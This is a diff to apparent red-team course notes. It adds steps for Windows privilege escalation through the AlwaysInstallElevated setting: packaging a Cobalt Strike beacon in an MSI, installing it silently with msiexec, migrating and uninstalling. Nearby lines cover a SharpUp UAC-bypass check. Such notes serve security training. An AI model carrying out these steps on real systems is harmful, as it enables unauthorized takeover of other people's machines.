@@ -206,7 +206,17 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 7. Connect -> `connect localhost 4444`
 
 #### method -> always install elevated
-
+0. metasploit method of exploiting this is fairly easy.
+1. Generate a TCP-BEACON.exe
+2. Open Visual Studio -> Create New Project -> Setup Wizard -> Create a Setup for Windows Application -> Add beacon file .exe (under any additional files you want to include) -> Select the project -> Change Target Platform to x64
+3. Click on the project -> View -> Custom Actions -> Install -> Add custom action -> select beaon.exe
+4. Run 64bit = True
+5. Save it and Build it, a **.msi** will be generated
+6. `beacon> run msiexec /i BeaconInstaller.msi /q /n` 
+7. `connect localhost 4444`
+8. Migrate to some other process
+9. `beacon> run msiexec /q /n uninstall BeaconInstaller.msi`
+10. `connect localhost 4444`
 #### method -> UAC Bypass
 1. First run the SharpUp.exe via command `execute-assembly /opt/CRTO/SharpUp.exe audit`
 2. If you see some error like **In medium integrity but user is a local administrator - UAC can be bypassed.** Then this attack **may** be successful. 
